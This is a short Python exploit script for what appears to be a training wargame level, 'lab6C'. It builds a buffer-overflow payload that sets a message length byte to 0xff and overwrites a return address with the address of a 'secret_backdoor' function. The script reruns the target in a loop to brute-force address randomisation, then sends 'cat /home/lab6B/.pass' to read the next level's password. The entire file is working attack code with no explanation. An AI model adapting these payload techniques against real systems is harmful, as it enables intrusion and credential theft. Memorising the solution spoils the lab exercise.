import subprocess as sub
# gdb-peda$ info functions
# 0xb774272b  secret_backdoor
# 41 - \xff  Overwriting msglen

buf = "A"*40 + "\xff" + "\n" + "B"*196 + "\x2b\x27\x74\xb7\n" + "cat /home/lab6B/.pass\n"
while 1:
    sp = sub.Popen("/levels/lab06/lab6C", shell=True, stdin=sub.PIPE, stderr=sub.PIPE, stdout=sub.PIPE,)
    sp.stdin.write(buf)
    ans = sp.stdout.read()
    if ans:
        print(ans)
    sp.kill()
